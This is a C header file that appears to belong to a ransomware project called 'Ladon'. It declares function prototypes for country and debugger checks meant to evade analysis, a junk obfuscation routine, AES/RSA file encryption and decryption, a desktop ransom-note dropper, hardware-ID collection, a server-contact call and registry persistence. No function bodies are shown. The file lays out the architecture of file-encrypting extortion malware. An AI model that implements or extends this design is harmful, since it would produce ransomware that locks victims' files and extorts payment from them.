#pragma once

#pragma check_stack(off)
#pragma runtime_checks("", off)

#include "WindowsIAT.h"

#define false FALSE
#define true TRUE

void *zmemccpy(void *dst, const void *src, int c, size_t count);
char *zstrncpy(char *dest, const char *src, size_t n);
void *_memcpy(void* dest, const void* src, SIZE_T count);

int __CmpStrW(LPCWSTR s1, LPCWSTR s2);
BOOL LadonCheckCountry();

BOOL LadonIsWindowOpen(LPWSTR *lpszClassName, DWORD dsNumDebug);
BOOL LadonIsBeingDebugged();

INT
Junk(INT a, INT b);

BOOL DropNoteDesktop(LPCSTR note);


BOOL LadonCryptPrepareAES();
VOID LadonCryptDestroyAES();
BOOL LadonCryptPrepareRSA();
VOID LadonCryptDestroyRSA();
VOID LadonCryptDestroyKey(HCRYPTKEY hKey);

BOOL LadonEncryptFile(HCRYPTKEY hKeyRSA, LPCWSTR lpszIn, LPCWSTR lpszOut);
BOOL LadonDecryptFile(HCRYPTKEY hKeyRSA, LPCWSTR lpszIn, LPCWSTR lpszOut);
BOOL LadonCryptImportRSAPublicKey(HCRYPTKEY *phRSAKey, LPCSTR pvBuffer);
BOOL LadonCryptImportRSAPrivateKey(HCRYPTKEY *phRSAKey, LPCSTR pvBuffer);


VOID LadonZeroMemory(LPVOID lpvBuffer, DWORD dwSize);

LPSTR getHwid();
LPSTR getServerResponse(LPSTR url);

#define LADON_ENCRYPT_MODE 0
#define LADON_DECRYPT_MODE 1

int LadonDoEncrypt(char *json_str);
int LadonDoDecrypt(char *json_str);

BOOL AddToRegistry(LPCWSTR registry);
BOOL RemoveRegistry(LPCWSTR registry);

#include "linked_list.h"
#include "hashmap.h"
#include "json.h"

BOOL NOPOINTOFRETURN();